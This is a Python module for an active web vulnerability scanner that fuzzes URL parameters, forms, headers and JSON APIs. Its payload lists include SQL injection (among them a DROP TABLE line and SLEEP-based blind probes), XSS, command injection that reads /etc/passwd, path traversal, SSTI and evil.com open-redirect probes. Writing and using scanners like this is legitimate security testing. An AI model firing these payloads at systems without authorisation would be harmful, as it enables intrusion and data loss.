"""
Advanced Vulnerability Scanner for SecureScan Pro
Implements ZAP/Burp-style active scanning:
  - Form fuzzing (POST body injection into every discovered form field)
  - Blind SQLi (time-based, boolean-based)
  - Error-based SQLi
  - Reflected + DOM-hint XSS (multiple vectors)
  - XSS in HTTP headers (Referer, User-Agent, X-Forwarded-For)
  - JSON body injection
  - Open redirect detection
  - Path traversal
  - Command injection probes
  - SSTI (Server-Side Template Injection)
  - CSRF token absence check
  - Auth-aware scanning (session cookie / Bearer token passthrough)
"""
import asyncio
import httpx
import logging
import time
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from app.core.config import settings

logger = logging.getLogger(__name__)


# ── Payload libraries ────────────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    "'", '"', "' OR '1'='1", '" OR "1"="1',
    "' OR 1=1--", "\" OR 1=1--",
    "'; DROP TABLE users--",
    "1' AND SLEEP(0)--",          # won't sleep but triggers parse
    "1 UNION SELECT NULL--",
    "' AND 1=CONVERT(int,@@version)--",
]

SQLI_BLIND_PAYLOAD   = "' AND SLEEP(5)--"       # MySQL time-based
SQLI_BLIND_PAYLOAD_MSSQL = "'; WAITFOR DELAY '0:0:5'--"
SQLI_BOOL_TRUE  = "' OR '1'='1"
SQLI_BOOL_FALSE = "' OR '1'='2"

SQLI_ERROR_SIGNATURES = [
    'sql syntax', 'mysql_fetch', 'ora-01756', 'unclosed quotation',
    'quoted string not properly terminated', 'syntax error',
    'sqlstate', 'odbc driver', 'pg_query', 'warning: mysql',
    'supplied argument is not a valid mysql', 'you have an error in your sql syntax',
    'microsoft ole db provider for sql server', 'invalid query',
    'column count doesn\'t match', 'division by zero',
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "& whoami",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
]

CMDI_SIGNATURES  = ["uid=", "root:", "/bin/bash", "www-data"]
SSTI_SIGNATURES  = ["49", "49\n"]   # 7*7=49
TRAVERSAL_SIGS   = ["root:x:", "[boot loader]", "bin/bash"]


class VulnScanner:
    """
    Full active vulnerability scanner — ZAP/Burp-style.
    Fuzzes URL params, form fields (GET+POST), JSON bodies,
    and HTTP headers for SQLi, XSS, SSTI, CMDi, path traversal,
    open redirect, and CSRF.
    """

    def __init__(self):
        self.base_headers = {
            "User-Agent":      "SecureScan-Pro/1.0 (Security Scanner)",
            "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }

    # ── Public entry point ───────────────────────────────────────────────────

    async def scan(
        self,
        target: str,
        crawl_data: Optional[Dict] = None,
        auth_config: Optional[Dict] = None,
        depth: str = "medium",
    ) -> Dict[str, Any]:
        """
        Run all vulnerability probes against the target.
        Pass crawl_data (from WebCrawler) to enable form fuzzing.
        Pass auth_config = {"type": "cookie"|"bearer"|"basic", "credentials": {...}}
        to scan authenticated surfaces.
        """
        target = self._ensure_protocol(target)
        vulns: List[Dict] = []

        # Build session headers (auth passthrough)
        session_headers = dict(self.base_headers)
        session_cookies: Dict[str, str] = {}
        if auth_config:
            session_headers, session_cookies = self._apply_auth(
                auth_config, session_headers
            )

        try:
            async with httpx.AsyncClient(
                verify=False,
                timeout=15.0,
                follow_redirects=True,
                headers=session_headers,
                cookies=session_cookies,
            ) as client:

                # 1. URL param injection (GET params already in URL)
                vulns += await self._probe_url_params(client, target, depth)
                
                # Also probe params in all discovered URLs
                if crawl_data and "urls" in crawl_data:
                    for crawled_url in crawl_data.get("urls", [])[:20]: # Limit to reasonable number to prevent hanging forever
                        if "?" in crawled_url:
                            vulns += await self._probe_url_params(client, crawled_url, depth)

                # 2. Common GET param fuzzing (?id=, ?q=, ?page=, etc.)
                if depth != "shallow":
                    vulns += await self._probe_common_params(client, target)

                # 3. Header-based XSS / injection
                vulns += await self._probe_headers(client, target)

                if depth != "shallow":
                    # 4. Open redirect
                    vulns += await self._probe_open_redirect(client, target)

                    # 5. Path traversal
                    vulns += await self._probe_path_traversal(client, target)

                    # 6. SSTI
                    vulns += await self._probe_ssti(client, target)

                # 7. Form fuzzing (requires crawl_data)
                if crawl_data:
                    forms = crawl_data.get("forms", [])
                    vulns += await self._fuzz_forms(client, forms, target, depth)

                # 8. JSON endpoint fuzzing
                if depth != "shallow":
                    vulns += await self._probe_json_endpoints(client, target)

                # 9. CSRF check (on crawled forms)
                if crawl_data:
                    vulns += self._check_csrf(crawl_data.get("forms", []))

        except Exception as e:
            logger.error(f"VulnScanner init failed for {target}: {e}")
            return {
                "status": "error",
                "scanner": "vuln_active",
                "error": str(e),
                "vulnerabilities": [],
            }

        # Deduplicate by (type, location, title) — keep each unique finding
        seen: set = set()
        unique: List[Dict] = []
        for v in vulns:
            key = (v.get("type"), v.get("location", ""), v.get("title", ""))
            if key not in seen:
                seen.add(key)
                unique.append(v)

        logger.info(f"VulnScanner: {len(unique)} unique findings for {target}")
        return {
            "status": "completed",
            "scanner": "vuln_active",
            "vulnerabilities": unique,
        }

    # ── 1. URL param probing ─────────────────────────────────────────────────

    async def _probe_url_params(
        self, client: httpx.AsyncClient, target: str, depth: str = "medium"
    ) -> List[Dict]:
        """Inject into existing URL query parameters."""
        vulns = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            return vulns

        for param_name in params:
            # SQLi error-based
            for payload in SQLI_ERROR_PAYLOADS[:4]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                url = parsed._replace(
                    query=urlencode(test_params, doseq=True)
                ).geturl()
                try:
                    r = await client.get(url)
                    if self._sqli_error(r.text):
                        vulns.append(self._vuln(
                            "sql_injection", "critical",
                            "SQL Injection (Error-Based)",
                            f"Parameter '{param_name}' is vulnerable to SQL injection. "
                            f"Payload: {payload}",
                            url,
                        ))
                        break
                except Exception:
                    pass

            # Blind SQLi (time-based)
            if depth != "shallow":
                v = await self._blind_sqli(client, target, "GET", param_name)
                if v:
                    vulns.append(v)

            # XSS
            for payload in XSS_PAYLOADS[:3]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                url = parsed._replace(
                    query=urlencode(test_params, doseq=True)
                ).geturl()
                try:
                    r = await client.get(url)
                    if payload in r.text or payload.lower() in r.text.lower():
                        vulns.append(self._vuln(
                            "reflected_xss", "high",
                            "Reflected XSS",
                            f"Parameter '{param_name}' reflects unsanitized input. "
                            f"Payload: {payload}",
                            url,
                        ))
                        break
                except Exception:
                    pass

        return vulns

    # ── 2. Common param fuzzing ──────────────────────────────────────────────

    async def _probe_common_params(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Dict]:
        """Test common GET parameter names that are frequently injectable."""
        vulns = []
        common_params = ["id", "q", "search", "query", "page", "cat",
                         "item", "ref", "url", "redirect", "file", "path",
                         "user", "username", "email", "name", "input"]
        base = target.rstrip("/")

        for param in common_params:
            # SQLi
            for payload in SQLI_ERROR_PAYLOADS[:3]:
                url = f"{base}?{param}={payload}"
                try:
                    r = await client.get(url)
                    if self._sqli_error(r.text):
                        vulns.append(self._vuln(
                            "sql_injection", "critical",
                            "SQL Injection (Error-Based)",
                            f"Parameter '{param}' is vulnerable to SQLi. Payload: {payload}",
                            url,
                        ))
                        break
                except Exception:
                    pass

            # XSS
            for xss in XSS_PAYLOADS[:2]:
                url = f"{base}?{param}={xss}"
                try:
                    r = await client.get(url)
                    if xss in r.text:
                        vulns.append(self._vuln(
                            "reflected_xss", "high",
                            "Reflected XSS",
                            f"Parameter '{param}' reflects unsanitized XSS payload.",
                            url,
                        ))
                        break
                except Exception:
                    pass

        return vulns

    # ── 3. Header injection ──────────────────────────────────────────────────

    async def _probe_headers(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Dict]:
        """Test XSS / injection via HTTP headers (Referer, UA, X-Forwarded-For)."""
        vulns = []
        xss = XSS_PAYLOADS[0]

        header_tests = {
            "Referer":         xss,
            "User-Agent":      xss,
            "X-Forwarded-For": xss,
            "X-Forwarded-Host": "evil.com",
        }

        for header, payload in header_tests.items():
            try:
                r = await client.get(target, headers={header: payload})
                if xss in r.text:
                    vulns.append(self._vuln(
                        "header_injection_xss", "high",
                        f"XSS via HTTP Header ({header})",
                        f"The server reflects the '{header}' header value unsanitised "
                        f"in the response body.",
                        target,
                    ))
            except Exception:
                pass

        return vulns

    # ── 4. Open redirect ─────────────────────────────────────────────────────

    async def _probe_open_redirect(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Dict]:
        """Probe redirect parameters for open redirect."""
        vulns = []
        redirect_params = ["redirect", "url", "next", "return",
                           "returnUrl", "redirect_uri", "continue", "dest"]
        base = target.rstrip("/")

        for param in redirect_params:
            for evil in OPEN_REDIRECT_PAYLOADS[:2]:
                url = f"{base}?{param}={evil}"
                try:
                    # Don't follow redirects so we can see the Location header
                    r = await client.get(url, follow_redirects=False)
                    location = r.headers.get("location", "")
                    if "evil.com" in location or location.startswith("//"):
                        vulns.append(self._vuln(
                            "open_redirect", "medium",
                            "Open Redirect",
                            f"Parameter '{param}' causes an open redirect to "
                            f"'{location}'. Attackers can abuse this for phishing.",
                            url,
                        ))
                        break
                except Exception:
                    pass

        return vulns

    # ── 5. Path traversal ────────────────────────────────────────────────────

    async def _probe_path_traversal(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Dict]:
        """Probe file/path parameters for directory traversal."""
        vulns = []
        file_params = ["file", "path", "page", "include", "load",
                       "template", "doc", "document", "img", "image"]
        base = target.rstrip("/")

        for param in file_params:
            for payload in PATH_TRAVERSAL_PAYLOADS[:2]:
                url = f"{base}?{param}={payload}"
                try:
                    r = await client.get(url)
                    if any(sig in r.text for sig in TRAVERSAL_SIGS):
                        vulns.append(self._vuln(
                            "path_traversal", "critical",
                            "Path Traversal / Local File Inclusion",
                            f"Parameter '{param}' allows reading files outside the "
                            f"web root. Payload: {payload}",
                            url,
                        ))
                        break
                except Exception:
                    pass

        return vulns

    # ── 6. SSTI ──────────────────────────────────────────────────────────────

    async def _probe_ssti(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Dict]:
        """Detect Server-Side Template Injection."""
        vulns = []
        base = target.rstrip("/")
        test_params = ["name", "q", "search", "template", "msg", "message"]

        # Fetch baseline response to avoid false positives (pages that already contain '49')
        try:
            baseline_r = await client.get(base)
            baseline_text = baseline_r.text
        except Exception:
            baseline_text = ""

        for param in test_params:
            for payload in SSTI_PAYLOADS:
                url = f"{base}?{param}={payload}"
                try:
                    r = await client.get(url)
                    # Only flag if '49' appears in response but NOT in baseline
                    if "49" in r.text and "49" not in baseline_text:
                        vulns.append(self._vuln(
                            "ssti", "critical",
                            "Server-Side Template Injection (SSTI)",
                            f"Parameter '{param}' evaluates template expressions. "
                            f"Payload '{payload}' returned '49' (7×7). "
                            f"This can lead to Remote Code Execution.",
                            url,
                        ))
                        break
                except Exception:
                    pass

        return vulns

    # ── 7. Form fuzzing ──────────────────────────────────────────────────────

    async def _fuzz_forms(
        self,
        client: httpx.AsyncClient,
        forms: List[Dict],
        target: str,
        depth: str = "medium"
    ) -> List[Dict]:
        """
        Fuzz every discovered form field with SQLi, XSS, CMDi, SSTI payloads.
        Handles both GET and POST forms, preserves non-tested fields with defaults.
        This is the ZAP/Burp-style form fuzzing.
        """
        vulns = []

        for form in forms:
            action  = form.get("action") or target
            method  = form.get("method", "GET").upper()
            inputs  = form.get("inputs", [])

            # Build baseline data (use default/empty values for all fields)
            baseline: Dict[str, str] = {}
            for inp in inputs:
                name = inp.get("name", "")
                if not name or inp.get("type") in ("submit", "button", "image", "reset", "file"):
                    continue
                baseline[name] = inp.get("value") or self._default_value(inp)

            if not baseline:
                continue

            # Fuzz each field one at a time
            for field_name in list(baseline.keys()):
                # ── SQLi error-based ──
                for payload in SQLI_ERROR_PAYLOADS[:5]:
                    data = {**baseline, field_name: payload}
                    try:
                        r = await self._submit_form(client, action, method, data)
                        if r and self._sqli_error(r.text):
                            vulns.append(self._vuln(
                                "sql_injection", "critical",
                                "SQL Injection in Form Field (Error-Based)",
                                f"Form field '{field_name}' at '{action}' is "
                                f"vulnerable to SQL injection. Payload: {payload}",
                                action,
                            ))
                            break
                    except Exception:
                        pass

                # ── Blind SQLi (time-based) ──
                if depth != "shallow":
                    v = await self._blind_sqli_form(
                        client, action, method, baseline, field_name
                    )
                    if v:
                        vulns.append(v)

                # ── XSS ──
                for xss in XSS_PAYLOADS[:4]:
                    data = {**baseline, field_name: xss}
                    try:
                        r = await self._submit_form(client, action, method, data)
                        if r and (xss in r.text or xss.lower() in r.text.lower()):
                            vulns.append(self._vuln(
                                "reflected_xss", "high",
                                "Reflected XSS in Form Field",
                                f"Form field '{field_name}' at '{action}' reflects "
                                f"unsanitized input in the response. Payload: {xss}",
                                action,
                            ))
                            break
                    except Exception:
                        pass

                # ── SSTI ──
                for ssti in SSTI_PAYLOADS[:2]:
                    data = {**baseline, field_name: ssti}
                    try:
                        r = await self._submit_form(client, action, method, data)
                        if r and "49" in r.text:
                            vulns.append(self._vuln(
                                "ssti", "critical",
                                "SSTI in Form Field",
                                f"Form field '{field_name}' at '{action}' evaluates "
                                f"template expressions. Payload: {ssti}",
                                action,
                            ))
                            break
                    except Exception:
                        pass

                # ── Command injection ──
                for cmdi in CMDI_PAYLOADS[:3]:
                    data = {**baseline, field_name: cmdi}
                    try:
                        r = await self._submit_form(client, action, method, data)
                        if r and any(sig in r.text for sig in CMDI_SIGNATURES):
                            vulns.append(self._vuln(
                                "command_injection", "critical",
                                "Command Injection in Form Field",
                                f"Form field '{field_name}' at '{action}' executes "
                                f"OS commands. Payload: {cmdi}",
                                action,
                            ))
                            break
                    except Exception:
                        pass

        return vulns

    # ── 8. JSON endpoint fuzzing ─────────────────────────────────────────────

    async def _probe_json_endpoints(
        self, client: httpx.AsyncClient, target: str
    ) -> List[Dict]:
        """
        POST JSON payloads to common API endpoints.
        Tests SQLi and XSS in JSON body parameters.
        """
        vulns = []
        api_paths = ["/api/login", "/api/search", "/api/user",
                     "/api/v1/login", "/api/v1/search", "/login", "/search"]
        base = target.rstrip("/")

        json_tests = [
            {"username": SQLI_ERROR_PAYLOADS[0], "password": "test"},
            {"query":    SQLI_ERROR_PAYLOADS[2]},
            {"name":     XSS_PAYLOADS[0]},
            {"search":   XSS_PAYLOADS[1]},
        ]

        for path in api_paths:
            url = f"{base}{path}"
            for body in json_tests:
                try:
                    r = await client.post(
                        url,
                        json=body,
                        headers={"Content-Type": "application/json"},
                        timeout=8.0,
                    )
                    if r.status_code in (200, 400, 422, 500):
                        if self._sqli_error(r.text):
                            vulns.append(self._vuln(
                                "sql_injection_json", "critical",
                                "SQL Injection in JSON API",
                                f"JSON endpoint '{path}' is vulnerable to SQL injection. "
                                f"Payload: {list(body.values())[0]}",
                                url,
                            ))
                        for xss in XSS_PAYLOADS[:2]:
                            if xss in r.text:
                                vulns.append(self._vuln(
                                    "xss_json_api", "high",
                                    "XSS in JSON API Response",
                                    f"JSON endpoint '{path}' reflects unsanitized input.",
                                    url,
                                ))
                                break
                except Exception:
                    pass

        return vulns

    # ── 9. CSRF check ────────────────────────────────────────────────────────

    def _check_csrf(self, forms: List[Dict]) -> List[Dict]:
        """
        Check if POST forms lack CSRF tokens.
        Looks for common token field names.
        """
        vulns = []
        csrf_names = {"csrf", "csrf_token", "csrfmiddlewaretoken", "_token",
                      "authenticity_token", "__requestverificationtoken",
                      "csrf-token", "xsrf-token"}

        for form in forms:
            if form.get("method", "GET").upper() != "POST":
                continue

            field_names = {
                inp.get("name", "").lower()
                for inp in form.get("inputs", [])
                if inp.get("name")
            }

            has_csrf = bool(field_names & csrf_names)
            # also check hidden fields
            hidden_names = {
                inp.get("name", "").lower()
                for inp in form.get("inputs", [])
                if inp.get("type") == "hidden" and inp.get("name")
            }
            has_csrf = has_csrf or bool(hidden_names & csrf_names)

            if not has_csrf:
                action = form.get("action", "unknown")
                vulns.append(self._vuln(
                    "csrf", "medium",
                    "Missing CSRF Token on POST Form",
                    f"The POST form at '{action}' does not include a CSRF token. "
                    f"Attackers can forge cross-site requests on behalf of logged-in users.",
                    action,
                ))

        return vulns

    # ── Blind SQLi helper ────────────────────────────────────────────────────

    async def _blind_sqli(
        self,
        client: httpx.AsyncClient,
        target: str,
        method: str,
        param_name: str,
    ) -> Optional[Dict]:
        """
        Time-based blind SQLi: measure response time with SLEEP(5) payload.
        If response takes >4s longer than baseline, flag it.
        """
        base = target.rstrip("/")
        baseline_url = f"{base}?{param_name}=1"
        blind_url    = f"{base}?{param_name}={SQLI_BLIND_PAYLOAD}"

        try:
            t0 = time.monotonic()
            await client.get(baseline_url, timeout=8.0)
            baseline_time = time.monotonic() - t0

            t0 = time.monotonic()
            await client.get(blind_url, timeout=12.0)
            blind_time = time.monotonic() - t0

            if blind_time - baseline_time > 4.0:
                return self._vuln(
                    "sql_injection_blind", "critical",
                    "Blind SQL Injection (Time-Based)",
                    f"Parameter '{param_name}' is vulnerable to time-based blind SQLi. "
                    f"SLEEP(5) payload caused {blind_time:.1f}s delay "
                    f"vs baseline {baseline_time:.1f}s.",
                    blind_url,
                )
        except Exception:
            pass
        return None

    async def _blind_sqli_form(
        self,
        client: httpx.AsyncClient,
        action: str,
        method: str,
        baseline_data: Dict[str, str],
        field_name: str,
    ) -> Optional[Dict]:
        """Time-based blind SQLi on form fields."""
        try:
            t0 = time.monotonic()
            await self._submit_form(client, action, method, baseline_data, timeout=8.0)
            baseline_time = time.monotonic() - t0

            blind_data = {**baseline_data, field_name: SQLI_BLIND_PAYLOAD}
            t0 = time.monotonic()
            await self._submit_form(client, action, method, blind_data, timeout=12.0)
            blind_time = time.monotonic() - t0

            if blind_time - baseline_time > 4.0:
                return self._vuln(
                    "sql_injection_blind", "critical",
                    "Blind SQL Injection in Form Field (Time-Based)",
                    f"Form field '{field_name}' at '{action}' is vulnerable to "
                    f"time-based blind SQLi. Delay: {blind_time:.1f}s vs {baseline_time:.1f}s.",
                    action,
                )
        except Exception:
            pass
        return None

    # ── Utilities ────────────────────────────────────────────────────────────

    async def _submit_form(
        self,
        client: httpx.AsyncClient,
        action: str,
        method: str,
        data: Dict[str, str],
        timeout: float = 10.0,
    ) -> Optional[httpx.Response]:
        try:
            if method == "POST":
                return await client.post(action, data=data, timeout=timeout)
            else:
                return await client.get(action, params=data, timeout=timeout)
        except Exception:
            return None

    def _sqli_error(self, text: str) -> bool:
        t = text.lower()
        return any(sig in t for sig in SQLI_ERROR_SIGNATURES)

    def _apply_auth(
        self,
        auth_config: Dict,
        headers: Dict[str, str],
    ) -> Tuple[Dict[str, str], Dict[str, str]]:
        """Return updated headers and cookies for auth-aware scanning."""
        cookies: Dict[str, str] = {}
        auth_type = auth_config.get("type", "")
        creds     = auth_config.get("credentials", {})

        if auth_type == "bearer":
            headers = {**headers, "Authorization": f"Bearer {creds.get('token','')}"}
        elif auth_type == "basic":
            import base64
            pair = f"{creds.get('username','')}:{creds.get('password','')}"
            encoded = base64.b64encode(pair.encode()).decode()
            headers = {**headers, "Authorization": f"Basic {encoded}"}
        elif auth_type == "cookie":
            cookies = creds.get("cookies", {})
        elif auth_type == "header":
            for k, v in creds.get("headers", {}).items():
                headers = {**headers, k: v}

        return headers, cookies

    def _default_value(self, inp: Dict) -> str:
        """Generate a sensible default value for an input field."""
        inp_type = inp.get("type", "text")
        name     = inp.get("name", "").lower()
        if inp_type == "email":      return "test@example.com"
        if inp_type == "number":     return "1"
        if inp_type == "tel":        return "1234567890"
        if inp_type == "url":        return "https://example.com"
        if inp_type == "password":   return "TestPass123!"
        if "email" in name:          return "test@example.com"
        if "pass" in name:           return "TestPass123!"
        if "phone" in name:          return "1234567890"
        if "age" in name or "num" in name: return "1"
        return "test"

    def _vuln(
        self,
        vuln_type: str,
        severity: str,
        title: str,
        description: str,
        location: str,
    ) -> Dict[str, Any]:
        return {
            "type":        vuln_type,
            "severity":    severity,
            "title":       title,
            "description": description,
            "location":    location,
        }

    def _ensure_protocol(self, target: str) -> str:
        if not target.startswith(("http://", "https://")):
            return f"https://{target}"
        return target
